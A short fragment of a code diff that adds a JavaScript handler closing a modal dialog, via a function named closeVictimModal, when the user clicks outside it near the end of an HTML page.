+            if (event.target === modal) {
+                closeVictimModal();
+            }
         }
     </script>
 </body>
